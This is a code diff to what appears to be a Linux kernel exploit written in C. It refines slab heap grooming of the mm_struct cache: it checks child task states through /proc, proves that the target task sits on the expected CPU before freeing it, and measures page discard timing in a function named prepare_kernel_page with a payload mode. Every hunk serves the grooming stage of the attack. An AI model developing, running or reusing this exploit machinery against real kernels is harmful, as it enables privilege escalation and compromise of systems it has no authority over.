@@ -1206,6 +1206,33 @@ static int task_cpu_hint(pid_t pid) {
   return -1;
 }
 
+/* State character from /proc/<pid>/stat ('R','S','D','Z',...) or 0 when the
+ * task is gone.  A zombie has already run exit_mm(), so its mm free is in the
+ * past and the anchor slot it owned may have been reused. */
+static int task_state_char(pid_t pid) {
+  char path[64];
+  char buf[512];
+  char *p;
+  int fd;
+  ssize_t n;
+  snprintf(path, sizeof(path), "/proc/%d/stat", (int)pid);
+  fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+  p = strrchr(buf, ')');
+  if (p == NULL || p[1] != ' ') {
+    return 0;
+  }
+  return (unsigned char)p[2];
+}
+
 pid_t clone_child_cpu(size_t cpu) {
   if (pin_rw[0] < 0 && pipe(pin_rw) != 0) {
     pin_rw[0] = -1;
@@ -3013,6 +3040,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       long freeze_active = -1, freeze_num = -1, freeze_slabs = -1;
       long core_active = -1, core_num = -1, core_slabs = -1;
       long empty_active = -1, empty_num = -1, empty_slabs = -1;
+      long ctl_active = -1, ctl_num = -1, ctl_slabs = -1;
+      double free_done_t0 = -1;
       long free_wait_ms = 20;
       int image_done = -1;
       int image_want = -1;
@@ -3076,6 +3105,36 @@ uintptr_t prepare_kernel_page(int payload_mode) {
        * crossing has put the page on n->partial above min_partial. */
       pin_to_core(CORE);
       freeze_kill = pre_ctx.mm_cnt - 1;
+      /* Ownership of the 32 anchor slots, measured before any free: a child
+       * that died earlier already ran exit_mm(), so its slot was free and the
+       * freezer population forked after the burst can hold it.  The page then
+       * cannot empty when the 31 fillers and the target are freed, no matter
+       * what the node partial count is. */
+      {
+        size_t alive = 0, zombie = 0, gone = 0;
+        int tst;
+        int exclusive;
+        for (size_t i = 0; i < freeze_kill; i++) {
+          int st = task_state_char(pre_ctx.childs[i]);
+          if (st == 0) {
+            gone++;
+          } else if (st == 'Z' || st == 'X') {
+            zombie++;
+          } else {
+            alive++;
+          }
+        }
+        tst = task_state_char(target);
+        exclusive = (zombie == 0 && gone == 0 && tst != 0 && tst != 'Z' &&
+                     tst != 'X');
+        pr_info("KS_SLAB_ALIVE slots=%zu alive=%zu zombie=%zu gone=%zu "
+                "target=%c exclusive=%d\n",
+                freeze_kill + 1, alive, zombie, gone, tst ? tst : '-',
+                exclusive);
+        if (!exclusive) {
+          pin_bad++;
+        }
+      }
       pr_info("KS_SLAB_OWNERS slots=%d fillers=%zu target=1 total=%zu "
               "post_ctx=%zu lead_ctx=%zu cpu=%d\n", (int)mm_objs_per_slab,
               freeze_kill, freeze_kill + 1, post_ctx.mm_cnt,
@@ -3360,13 +3419,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
          * n->partial. */
         pin_to_core(CORE);
         {
-          long a0 = -1;
-          long a1 = -1;
           long need = mm_min_partial_limit();
           size_t pushes = 0;
-          size_t pages_seen = 0;
-          size_t proven = 0;
-          long page_drop = (long)mm_objs_per_slab - 1;
 
           if (need <= 0) {
             need = 5;
@@ -3375,31 +3429,29 @@ uintptr_t prepare_kernel_page(int payload_mode) {
            * already frozen returns FREE_FROZEN and pushes nothing, so the
            * number of pushes cannot be predicted from the index, and only a
            * measured drop proves the drain ran. */
-          for (; fz_i < KS_FREEZER_DRAIN && pushes < KS_FREEZER_DRAIN;
-               fz_i++) {
+          /* 128 kills is four per freezer page: enough to cross cpu_partial
+           * many times, and few enough that every page the crossing adds still
+           * holds ~28 live objects, so a later crossing cannot discard it and
+           * undo the count the anchor's free needs. */
+          for (; fz_i < KS_FREEZER_DRAIN && pushes < 128; fz_i++) {
             if (fz_drain[fz_i] <= 0) {
               continue;
             }
-            mm_slab_counts(&a0, NULL);
             kill_child(fz_drain[fz_i]);
             fz_drain[fz_i] = -1;
-            mm_slab_counts(&a1, NULL);
             pushes++;
-            if (a0 >= 0 && a1 >= 0 && a0 > a1) {
-              pages_seen = (size_t)((a0 - a1) / page_drop);
-              if ((a0 - a1) >= need * page_drop) {
-                proven = 1;
-                crossed = 1;
-                crossed_at = (int)need;
-                fed = pages_seen;
-                pobjects = pages_seen;
-                drain_pid = -1;
-                break;
-              }
-            }
           }
-          pr_info("KS_DRAIN pushes=%zu pages=%zu need=%ld proven=%zu cpu=%d\n",
-                  pushes, pages_seen, need, proven, sched_getcpu());
+          /* No page-count estimate: the accumulated value was a quotient of
+           * the active_objs drop by 31 and was never the number of pages the
+           * unfreeze added.  The crossing reports only its push count and the
+           * sample deltas that follow it. */
+          crossed = pushes > 0;
+          crossed_at = (int)pushes;
+          fed = pushes;
+          pobjects = pushes;
+          drain_pid = -1;
+          pr_info("KS_DRAIN pushes=%zu need=%ld cpu=%d\n", pushes, need,
+                  sched_getcpu());
           (void)kp_run_advance(&run, KP_STAGE_BASELINE);
           /* Claimer first, then the baseline: fork() copies the parent's mm,
            * so this process's own mm_struct is one mm-cache allocation and it
@@ -3460,6 +3512,18 @@ uintptr_t prepare_kernel_page(int payload_mode) {
             }
             pin_to_core(EMPTYING_CPU);
           }
+          /* The mm free runs inside the child's do_exit() on the CPU that
+           * child is on, so that CPU is a fact to prove before the kill, not
+           * after it.  A child on the wrong CPU parks the page on that CPU's
+           * c->partial where no drain in this chain would see it. */
+          {
+            int tcpu = task_cpu_hint(target);
+            pr_info("KS_FREE_CPU pid=%d cpu=%d expect=%d ok=%d\n", (int)target,
+                    tcpu, (int)EMPTYING_CPU, tcpu == (int)EMPTYING_CPU);
+            if (tcpu != (int)EMPTYING_CPU) {
+              pin_bad++;
+            }
+          }
           /* Quiescent baseline: the window from here to the sample after the
            * sends contains exactly one mm free, the target's own.  The
            * siblings above are already retired (their mm frees are in the
@@ -3491,20 +3555,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
                     "window=gate\n",
                     cross_active, cross_num, cross_slabs, stable);
           }
-          /* The mm free runs inside the child's do_exit() on the CPU that
-           * child is on, so that CPU is a fact to prove before the kill, not
-           * after it.  A child on the wrong CPU parks the page on that CPU's
-           * c->partial where no drain in this chain would see it. */
-          {
-            int tcpu = task_cpu_hint(target);
-            pr_info("KS_FREE_CPU pid=%d cpu=%d expect=%d ok=%d\n", (int)target,
-                    tcpu, (int)EMPTYING_CPU, tcpu == (int)EMPTYING_CPU);
-            if (tcpu != (int)EMPTYING_CPU) {
-              pin_bad++;
-            }
-          }
           (void)kp_run_advance(&run, KP_STAGE_FREE);
           kill_child(target);
+          free_done_t0 = ks_now_ms();
           child_leak = -1;
           /* waitpid() above rescheduled, so this sample is the CPU the close
            * and the sends below actually run on; it is what the gate uses. */
@@ -3610,44 +3663,69 @@ uintptr_t prepare_kernel_page(int payload_mode) {
                   cross_active, cross_num, cross_slabs);
           pr_info("KS_SAMPLE2 tag=empty active=%ld num=%ld slabs=%ld\n",
                   empty_active, empty_num, empty_slabs);
-          /* Quiet-window differential.  An empty page left on n->partial has
-           * no live object, so no later free can discard it: only an
-           * allocation can take it, and then the process holding it has to
-           * exit for it to empty again.  If the counters are flat across this
-           * window, the page that leaves in the control window below is the
-           * control's page, not the anchor's.  Measurement only: nothing is
-           * allocated or freed here, and no existing sample moves. */
-          if (crossed && post_f != NULL) {
-            long settle_a = -1, settle_n = -1, settle_s = -1;
-            usleep(50000);
-            rewind(post_f);
-            (void)mm_slab_scan(post_f, &settle_a, &settle_n, &settle_s);
-            pr_info("KS_SETTLE ms=50 active=%ld num=%ld slabs=%ld "
-                    "d_from_empty=%ld/%ld/%ld\n", settle_a, settle_n, settle_s,
-                    settle_a - empty_active, settle_n - empty_num,
-                    settle_s - empty_slabs);
-          }
-
-          /* Diagnostic only, and after every sample: the control page was
-           * built exactly like the anchor and is killed here to show that the
-           * same mechanics still discard.  It used to run before the anchor's
-           * free, where its own object and its deferred filler frees could
-           * move the anchor's delta. */
+          /* Tight differential.  The control page was built exactly like the
+           * anchor's and is still listed with one live object, so its free is
+           * the same slab_empty decision the anchor's free just made.  It is
+           * killed here, microseconds after the anchor's free and with no
+           * sleep in between: a discard now proves n->nr_partial >= min_partial
+           * at the anchor's free, because one page cannot join the node list
+           * and another leave it inside that gap.  Measurement only; the
+           * anchor's free and the image send have already run. */
           if (control_last > 0) {
             long ca = -1, cn = -1, cs = -1;
             kill_child(control_last);
             control_last = -1;
             if (post_f != NULL) {
+              /* Gap from the anchor's reaped free to this sample, not the
+               * control's own exit time: that is the interval over which the
+               * node partial count must not have moved. */
+              long us = (long)((ks_now_ms() - (free_done_t0 >= 0
+                                                   ? free_done_t0
+                                                   : ks_now_ms())) *
+                               1000.0);
+              long da, dn, ds;
+              const char *state;
               rewind(post_f);
               (void)mm_slab_scan(post_f, &ca, &cn, &cs);
-              pr_info("KS_CTL_FREE num=%ld->%ld slabs=%ld->%ld d_num=%ld "
-                      "d_slabs=%ld discarded=%d\n", empty_num, cn,
-                      empty_slabs, cs, cn - empty_num, cs - empty_slabs,
-                      (cn == empty_num - (long)mm_objs_per_slab &&
-                       cs == empty_slabs - 1)
-                          ? 1
-                          : 0);
+              da = ca - empty_active;
+              dn = cn - empty_num;
+              ds = cs - empty_slabs;
+              ctl_active = ca;
+              ctl_num = cn;
+              ctl_slabs = cs;
+              /* Only two of these four states answer the min_partial question;
+               * the frozen state means the control's free never reached the
+               * list and must not be read as a refusal. */
+              if (dn == -(long)mm_objs_per_slab && ds == -1 && da < 0) {
+                state = "listed-discarded";      /* count was >= min */
+              } else if (da < 0 && ds == 0) {
+                state = "listed-refused";        /* count was < min */
+              } else if (da == 0 && dn == 0 && ds == 0) {
+                state = "frozen";                /* says nothing about count */
+              } else {
+                state = "other";
+              }
+              pr_info("KS_CTL_TIGHT us=%ld active=%ld num=%ld slabs=%ld "
+                      "d_active=%ld d_num=%ld d_slabs=%ld discarded=%d "
+                      "state=%s\n",
+                      us, ca, cn, cs, da, dn, ds, ds == -1 ? 1 : 0, state);
             }
+          }
+          /* Quiet window after BOTH frees.  d_from_empty includes the control's
+           * own discard and is printed for continuity; d_from_ctl is the check
+           * that nothing moved after the last free, so a late discard of the
+           * anchor page still shows up here. */
+          if (post_f != NULL) {
+            long settle_a = -1, settle_n = -1, settle_s = -1;
+            usleep(50000);
+            rewind(post_f);
+            (void)mm_slab_scan(post_f, &settle_a, &settle_n, &settle_s);
+            pr_info("KS_SETTLE ms=50 active=%ld num=%ld slabs=%ld "
+                    "d_from_empty=%ld/%ld/%ld d_from_ctl=%ld/%ld/%ld\n",
+                    settle_a, settle_n, settle_s, settle_a - empty_active,
+                    settle_n - empty_num, settle_s - empty_slabs,
+                    settle_a - ctl_active, settle_n - ctl_num,
+                    settle_s - ctl_slabs);
           }
         }
         pr_info("KS_DRAIN_RESULT fed=%zu crossed=%d crossed_at=%d target=%d "
